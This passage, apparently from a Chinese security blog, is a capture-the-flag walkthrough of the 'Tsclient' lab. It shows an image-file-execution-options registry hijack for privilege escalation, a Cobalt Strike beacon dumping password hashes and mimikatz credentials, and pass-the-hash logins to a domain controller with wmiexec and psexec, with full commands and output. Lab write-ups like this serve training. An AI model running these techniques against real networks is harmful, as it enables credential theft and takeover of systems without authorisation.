(<code>FullControl</code>)</li>\n<li><code>Administrators</code>：完全控制 (<code>FullControl</code>)</li>\n<li><code>Users</code>：允许 <code>ReadKey</code></li>\n</ul>\n</li>\n</ul>\n<p>修改注册表劫持镜像，劫持打开放大镜则以<code>admin</code>权限启动<code>cmd</code></p>\n<pre><code class=\"hljs language-bash\">REG ADD <span class=\"hljs-string\">\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\"</span> /v Debugger /t REG_SZ /d <span class=\"hljs-string\">\"C:\\windows\\system32\\cmd.exe\"</span>\n</code></pre>\n<p>锁定电脑运行放大镜</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image28.png\" alt=\"image.png\"></p>\n<p>通过管理员cmd运行CS马</p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Aldrich\\Desktop\\2.exe\n</code></pre>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image29.png\" alt=\"image.png\"></p>\n<p>成功上线</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image30.png\" alt=\"image.png\"></p>\n<p>读取<code>Flag02</code></p>\n<pre><code class=\"hljs language-bash\">beacon> shell <span class=\"hljs-built_in\">type</span> C:\\<span class=\"hljs-built_in\">users</span>\\administrator\\flag\\flag02.txt\n[*] Tasked beacon to run: <span class=\"hljs-built_in\">type</span> C:\\<span class=\"hljs-built_in\">users</span>\\administrator\\flag\\flag02.txt\n[+] host called home, sent: 74 bytes\n[+] received output:\n   . .    .       . .       . .       .      .       . .       . .       . .    .    \n.+<span class=\"hljs-string\">'|=|`+.=|`+. .+'</span>|=|`+. .+<span class=\"hljs-string\">'|=|`+. .+'</span>|      |`+. .+<span class=\"hljs-string\">'|=|`+. .+'</span>|=|`+. .+<span class=\"hljs-string\">'|=|`+.=|`+. \n|.+'</span> |  | `+.| |  | `+.| |  | `+.| |  |      |  | |  | `+.| |  | `+ | |.+<span class=\"hljs-string\">' |  | `+.| \n     |  |      |  | .    |  |      |  |      |  | |  |=|`.  |  |  | |      |  |      \n     |  |      `+.|=|`+. |  |      |  |      |  | |  | `.|  |  |  | |      |  |      \n     |  |      .    |  | |  |    . |  |    . |  | |  |    . |  |  | |      |  |      \n     |  |      |`+. |  | |  | .+'</span>| |  | .+<span class=\"hljs-string\">'| |  | |  | .+'</span>| |  |  | |      |  |      \n     |.+<span class=\"hljs-string\">'      `+.|=|.+'</span> `+.|=|.+<span class=\"hljs-string\">' `+.|=|.+'</span> |.+<span class=\"hljs-string\">' `+.|=|.+'</span> `+.|  |.|      |.+<span class=\"hljs-string\">'      \n\nflag02: flag{cecb54ad-1f19-40a7-8830-9e7074e41150}\n</span></code></pre>\n<h2>信息收集 - 3</h2>\n<p>对域内信息进行收集</p>\n<p>因为是SYSTEM权限，直接<code>Dump hash</code></p>\n<pre><code class=\"hljs language-bash\">beacon> hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: 82541 bytes\n[+] received password hashes:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8e2eec0e9e0d89e1b046b696e0c2aef7:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n</code></pre>\n<p>这里直接使用<code>BloodHound</code>进行域内信息分析</p>\n<p>上传<code>SharpHound.exe</code> 运行并生成数据</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image31.png\" alt=\"image.png\"></p>\n<p>使用<code>BloodHound</code>分析域内信息</p>\n<p>惊奇的发现我们主机在与管理员组中</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image32.png\" alt=\"image.png\"></p>\n<h2>PTH</h2>\n<p>发现<code>win2016$</code>在域管组里，即机器账户可以Hash传递登录域控</p>\n<p>Dump <code>win2016$</code> 的hash，<code>80b757e0c26a39a49c8d5b7dcf31c00a</code></p>\n<pre><code class=\"hljs language-bash\">beacon> logonpasswords\n[*] Tasked beacon to run mimikatz<span class=\"hljs-string\">'s sekurlsa::logonpasswords command\n[+] host called home, sent: 312954 bytes\n[+] received output:\n\nAuthentication Id : 0 ; 10797205 (00000000:00a4c095)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/3/22 10:24:13\nSID               : S-1-5-90-0-2\n\tmsv :\t\n\t [00000003] Primary\n\t * Username : WIN2016$\n\t * Domain   : XIAORANG\n\t * NTLM     : 80b757e0c26a39a49c8d5b7dcf31c00a\n\t * SHA1     : 90feab478c5b4e0071943be53bed5844e7d60752\n</span></code></pre>\n<p>直接<code>PTH</code></p>\n<pre><code class=\"hljs language-bash\">proxychains4 wmiexec.py -hashes :80b757e0c26a39a49c8d5b7dcf31c00a xiaorang.lab/WIN2016\\<span class=\"hljs-variable\">$@172</span>.22.8.15 -codec gbk\n</code></pre>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/image33.png\" alt=\"image.png\"></p>\n<p>读取<code>flag</code></p>\n<pre><code class=\"hljs language-bash\">C:\\<span class=\"hljs-built_in\">users</span>\\administrator\\flag><span class=\"hljs-built_in\">type</span> flag03.txt\n _________               __    _                  _    \n|  _   _  |             [  |  (_)                / |_  \n|_/ | | \\_|.--.   .---.  | |  __  .---.  _ .--. `| |-<span class=\"hljs-string\">' \n    | |   ( (`\\] / /'</span>`\\] | | [  |/ /__\\\\[ `.-. | | |   \n   _| |_   `<span class=\"hljs-string\">'.'</span>. | \\__.  | |  | || \\__., | | | | | |,  \n  |_____| [\\__) )<span class=\"hljs-string\">'.___.'</span>[___][___]<span class=\"hljs-string\">'.__.'</span>[___||__]\\__/  \n\nCongratulations! ! !\n\nflag03: flag{10cad99f-d466-4a30-a394-10b7936006b9}\n</code></pre>\n<p>通过<code>psexec</code>也可以，主要看开启了什么端口</p>\n<pre><code class=\"hljs language-bash\"> root@kali  ~/Desktop/test/Tsclient  proxychains4 psexec.py xiaorang.lab/WIN2016\\<span class=\"hljs-variable\">$@172</span>.22.8.15 -hashes :80b757e0c26a39a49c8d5b7dcf31c00a -codec gbk\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.8.15:445  ...  OK\n[*] Requesting shares on 172.22.8.15.....\n[*] Found writable share ADMIN$\n[*] Uploading file kXCfYcAY.exe\n[*] Opening SVCManager on 172.22.8.15.....\n[*] Creating service RHmr on 172.22.8.15.....\n[*] Starting service RHmr.....\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.8.15:445  ...  OK\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.8.15:445 [!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\n ...  OK\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.8.15:445  ...  OK\nMicrosoft Windows [版本 10.0.20348.707]\n(c) Microsoft Corporation。保留所有权利。\n\nC:\\Windows\\system32> \n</code></pre>\n<h2>总结</h2>\n<p>不算难，但是知识挺杂的</p>","title":"春秋云镜 - Tsclient","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["春秋云镜","Linux靶机","Windows靶机","综合靶场"],"categories":"靶机","description":"Tsclient\n\n https://yunjing.ichunqiu.com/major/detail/1072?type=1 |\n \n\n\n\n分几次打，外网IP为：`39.98.110.115`，`39.99.143.130` 等…\n\n前期踩点\n\n直接 `fscan` 扫一波\n\n\n\n直接给`MSSQL`弱密码给干出来了`1qaz!QAZ` \n\nMSSQL 利用\n\n直接使用`MDUT`进行利用，直..."},"recentPosts":[{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"}]},"__N_SSG":true}